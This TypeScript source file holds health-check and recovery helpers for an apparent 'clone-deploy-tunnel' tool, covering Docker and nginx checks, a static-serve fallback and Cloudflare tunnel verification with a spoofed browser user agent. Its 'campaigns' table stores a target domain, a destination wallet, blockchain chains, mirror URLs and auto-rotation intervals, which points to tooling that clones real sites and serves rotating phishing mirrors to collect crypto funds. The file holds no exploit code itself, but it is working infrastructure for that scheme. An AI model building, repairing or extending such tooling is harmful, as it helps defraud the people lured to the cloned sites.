/**
 * Self-healing helpers for clone-deploy-tunnel — container health, tunnel monitor, DB schema.
 */
import { spawn } from 'node:child_process'
import { existsSync } from 'node:fs'
import path from 'node:path'

import { Pool } from 'pg'

const CAMPAIGNS_DDL = `CREATE TABLE IF NOT EXISTS "campaigns" (
  "id" uuid PRIMARY KEY DEFAULT gen_random_uuid() NOT NULL,
  "name" text NOT NULL,
  "target_domain" text NOT NULL,
  "destination_wallet" text NOT NULL,
  "chains" text[] DEFAULT '{}'::text[] NOT NULL,
  "auto_rotate" boolean DEFAULT false NOT NULL,
  "active" boolean DEFAULT true NOT NULL,
  "mirror_url" text,
  "mirror_subdomain" text,
  "rotation_interval_hours" integer DEFAULT 12 NOT NULL,
  "last_health_check_at" timestamp with time zone,
  "created_at" timestamp with time zone DEFAULT now() NOT NULL,
  "updated_at" timestamp with time zone DEFAULT now() NOT NULL
)`

function readEnvInt(key: string, fallback: number): number {
  const n = Number.parseInt(process.env[key]?.trim() ?? '', 10)
  return Number.isFinite(n) && n > 0 ? n : fallback
}

export function readContainerHealthTimeoutMs(): number {
  return readEnvInt('CLONE_CONTAINER_HEALTH_TIMEOUT_MS', 30_000)
}

export function readTunnelHealthIntervalMs(): number {
  return readEnvInt('CLONE_TUNNEL_HEALTH_INTERVAL_MS', 10_000)
}

export function readTunnelMaxRestarts(): number {
  return readEnvInt('CLONE_TUNNEL_MAX_RESTARTS', 3)
}

export function readTunnelVerifyTimeoutMs(): number {
  return readEnvInt('CLONE_TUNNEL_VERIFY_TIMEOUT_MS', 20_000)
}

function runCommand(
  command: string,
  args: string[],
  opts?: { cwd?: string; timeoutMs?: number },
): Promise<{ stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, {
      cwd: opts?.cwd,
      shell: process.platform === 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
    })
    let stdout = ''
    let stderr = ''
    const timer =
      opts?.timeoutMs != null
        ? setTimeout(() => {
            child.kill('SIGTERM')
          }, opts.timeoutMs)
        : null
    child.stdout?.on('data', (c: Buffer) => {
      stdout += c.toString()
    })
    child.stderr?.on('data', (c: Buffer) => {
      stderr += c.toString()
    })
    child.on('error', reject)
    child.on('close', (code) => {
      if (timer) clearTimeout(timer)
      if (code === 0) resolve({ stdout, stderr })
      else reject(new Error((stderr || stdout).trim().slice(0, 600) || `${command} exit ${code}`))
    })
  })
}

export async function campaignsTableExists(): Promise<boolean> {
  const url = process.env['DATABASE_URL']?.trim()
  if (!url) return true
  const pool = new Pool({ connectionString: url, max: 1, connectionTimeoutMillis: 8_000 })
  try {
    const res = await pool.query(
      `SELECT 1 FROM information_schema.tables
       WHERE table_schema = 'public' AND table_name = 'campaigns' LIMIT 1`,
    )
    return (res.rowCount ?? 0) > 0
  } catch {
    return false
  } finally {
    await pool.end().catch(() => undefined)
  }
}

/** Ensure campaigns table exists — inline DDL or pnpm db:migrate. */
export async function ensureCampaignsSchema(repoRoot: string): Promise<void> {
  const url = process.env['DATABASE_URL']?.trim()
  if (!url) {
    console.error(
      '[clone-tunnel] DATABASE_URL not set — campaign mirror_url updates will be skipped',
    )
    return
  }

  if (await campaignsTableExists()) return

  console.error(
    '[clone-tunnel] WARN: campaigns table missing — applying idempotent schema patch',
  )

  const pool = new Pool({ connectionString: url, max: 1, connectionTimeoutMillis: 15_000 })
  try {
    await pool.query(CAMPAIGNS_DDL)
    await pool.query(
      `CREATE INDEX IF NOT EXISTS "idx_campaigns_active" ON "campaigns" ("active")`,
    )
    if (await campaignsTableExists()) {
      console.error('[clone-tunnel] campaigns table created via inline DDL')
      return
    }
  } catch (e) {
    console.error(
      `[clone-tunnel] Inline campaigns DDL failed: ${e instanceof Error ? e.message : String(e)}`,
    )
  } finally {
    await pool.end().catch(() => undefined)
  }

  if (process.env['CLONE_AUTO_DB_MIGRATE']?.trim().toLowerCase() === 'false') {
    console.error(
      '[clone-tunnel] Run "pnpm db:migrate" before cloning to enable campaign updates.',
    )
    return
  }

  try {
    console.error('[clone-tunnel] Running pnpm db:migrate …')
    await runCommand('pnpm', ['db:migrate'], { cwd: repoRoot, timeoutMs: 180_000 })
    if (await campaignsTableExists()) {
      console.error('[clone-tunnel] campaigns table ready after db:migrate')
      return
    }
  } catch (e) {
    console.error(
      `[clone-tunnel] db:migrate failed: ${e instanceof Error ? e.message : String(e)}`,
    )
  }

  console.error(
    '[clone-tunnel] ACTION REQUIRED: Run "pnpm db:migrate" before cloning for campaign DB sync.',
  )
}

export type DockerContainerStatus = {
  running: boolean
  state: string
  name?: string
  id?: string
}

export async function getComposeContainerStatus(outDir: string): Promise<DockerContainerStatus> {
  try {
    const { stdout } = await runCommand(
      'docker',
      ['compose', 'ps', '--format', 'json'],
      { cwd: outDir, timeoutMs: 15_000 },
    )
    const lines = stdout
      .split(/\r?\n/)
      .map((l) => l.trim())
      .filter(Boolean)
    for (const line of lines) {
      try {
        const row = JSON.parse(line) as {
          State?: string
          Name?: string
          ID?: string
        }
        const state = (row.State ?? '').toLowerCase()
        if (state.includes('running') || state === 'up') {
          return { running: true, state: row.State ?? 'running', name: row.Name, id: row.ID }
        }
        if (state) {
          return { running: false, state: row.State ?? state, name: row.Name, id: row.ID }
        }
      } catch {
        /* not json line */
      }
    }
    if (/running|up/i.test(stdout)) {
      return { running: true, state: 'running' }
    }
    return { running: false, state: 'unknown' }
  } catch {
    return { running: false, state: 'unknown' }
  }
}

export async function fetchComposeContainerLogs(outDir: string, tail = 40): Promise<string> {
  try {
    const { stdout, stderr } = await runCommand(
      'docker',
      ['compose', 'logs', '--tail', String(tail)],
      { cwd: outDir, timeoutMs: 20_000 },
    )
    return (stdout + stderr).trim().slice(-2_000)
  } catch (e) {
    return e instanceof Error ? e.message : String(e)
  }
}

export async function waitForDockerContainerHealthy(
  outDir: string,
  timeoutMs = readContainerHealthTimeoutMs(),
): Promise<{ ok: boolean; detail?: string; logs?: string }> {
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    const status = await getComposeContainerStatus(outDir)
    if (status.running) return { ok: true }
    await new Promise((r) => setTimeout(r, 2_000))
  }
  const logs = await fetchComposeContainerLogs(outDir)
  return {
    ok: false,
    detail: 'nginx container not running after compose up',
    logs,
  }
}

export async function testNginxConfigInDocker(outDir: string): Promise<{ ok: boolean; detail: string }> {
  const nginxPath = path.join(outDir, 'nginx.conf')
  if (!existsSync(nginxPath)) {
    return { ok: true, detail: 'no nginx.conf — static serve mode' }
  }
  const abs = path.resolve(outDir)
  try {
    await runCommand(
      'docker',
      [
        'run',
        '--rm',
        '-v',
        `${abs}/nginx.conf:/etc/nginx/nginx.conf:ro`,
        'nginx:alpine',
        'nginx',
        '-t',
        '-c',
        '/etc/nginx/nginx.conf',
      ],
      { timeoutMs: 45_000 },
    )
    return { ok: true, detail: 'nginx -t passed' }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

let staticServeChild: ReturnType<typeof spawn> | null = null

export async function startStaticServeFallback(outDir: string, port: number): Promise<void> {
  if (staticServeChild?.pid) {
    try {
      staticServeChild.kill('SIGTERM')
    } catch {
      /* ignore */
    }
  }
  console.error(`[clone-tunnel] RECOVERY: serving static clone via npx serve on port ${port}`)
  staticServeChild = spawn(
    'pnpm',
    ['exec', 'serve', outDir, '-l', String(port)],
    {
      cwd: outDir,
      detached: true,
      stdio: 'ignore',
      shell: process.platform === 'win32',
    },
  )
  staticServeChild.unref()
  const deadline = Date.now() + 15_000
  while (Date.now() < deadline) {
    const health = await probeLocalMirrorHealth(port, 4_000)
    if (health.ok) return
    await new Promise((r) => setTimeout(r, 2_000))
  }
}

export async function probeLocalMirrorHealth(
  port: number,
  timeoutMs = 8_000,
): Promise<{ ok: boolean; status?: number }> {
  const paths = ['/mirror-health', '/']
  for (const p of paths) {
    try {
      const res = await fetch(`http://127.0.0.1:${port}${p}`, {
        signal: AbortSignal.timeout(timeoutMs),
      })
      if (res.ok || res.status === 404) return { ok: true, status: res.status }
    } catch {
      /* try next */
    }
  }
  return { ok: false }
}

export type TunnelProcess = {
  pid?: number
  kill: () => void
}

export async function verifyPublicTunnelUrl(
  publicUrl: string,
  timeoutMs = readTunnelVerifyTimeoutMs(),
): Promise<{ ok: boolean; status?: number; detail?: string }> {
  const deadline = Date.now() + timeoutMs
  let lastDetail = 'no response'
  while (Date.now() < deadline) {
    try {
      const res = await fetch(publicUrl, {
        method: 'GET',
        redirect: 'follow',
        signal: AbortSignal.timeout(12_000),
        headers: {
          'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        },
      })
      const body = await res.text()
      const is1033 =
        res.status === 530 ||
        res.status === 502 ||
        res.status === 503 ||
        /error\s*1033|cloudflare tunnel/i.test(body)
      if (!is1033 && (res.ok || res.status === 404 || body.length > 256)) {
        return { ok: true, status: res.status }
      }
      lastDetail = `HTTP ${res.status}${is1033 ? ' (tunnel error 1033)' : ''}`
    } catch (e) {
      lastDetail = e instanceof Error ? e.message : String(e)
    }
    await new Promise((r) => setTimeout(r, 2_000))
  }
  return { ok: false, detail: lastDetail }
}
